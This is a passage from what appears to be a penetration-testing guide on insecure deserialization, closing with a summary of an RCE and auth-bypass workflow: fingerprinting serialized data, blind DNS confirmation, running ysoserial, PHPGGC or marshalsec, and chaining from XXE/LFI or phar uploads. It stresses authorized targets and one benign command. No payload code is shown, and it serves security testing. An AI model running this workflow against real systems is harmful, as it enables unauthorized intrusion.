missed sink can't reach OOB/JNDI or pivot. Do that and the whole tree here — Java/PHP/.NET/Python/Ruby/Node RCE, ViewState,
phar, object-tamper auth bypass — collapses.

---

> **Final word:** insecure deserialization is "the server rebuilds an object from my bytes" turned into **remote code
> execution** (or auth bypass by tampering the object). Recognize the language from the signature, confirm **safely** with
> a blind DNS gadget, fire the **matching tool** (ysoserial / ysoserial.net / PHPGGC / marshalsec) for **one benign
> command**, and STOP. Chain from XXE/LFI (machineKey) or uploads (phar). Report CWE-502 impact-first, Critical.
> Authorized targets only — OOB-first, one command, clean up.
